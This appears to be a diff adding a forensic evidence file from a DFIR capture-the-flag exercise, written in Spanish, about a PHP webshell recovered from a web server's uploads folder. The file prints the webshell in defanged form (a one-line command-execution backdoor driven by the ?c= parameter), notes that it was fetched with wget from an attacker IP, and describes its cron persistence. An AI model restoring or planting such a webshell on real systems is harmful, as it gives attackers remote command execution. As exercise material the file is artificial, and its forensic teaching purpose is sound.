@@ -1,0 +1,12 @@
+=== CAPTURA DE EVIDENCIA — /var/www/uploads/shell.php ===
+Webshell hallada en el disco. Contenido DEFANGEADO (neutralizado) para manejo
+forense seguro. NO reconstruir ni ejecutar.
+
+  <?php
+  // webshell dropeada por el atacante (wget desde 45.13.37.7)
+  // FLAG{dfir_webshell_hallado}
+  if (isset($_GET['c'])) { sys'tem($_GET['c']); }   // <- RCE via ?c= (defangeado)
+  // persistencia: se relanza por cron cada 5 min (ver /etc/cron.d/phantom-maint)
+  ?>
+
+Hash SHA-256 del archivo original (registrado en la custodia): ver evidencia.sha256
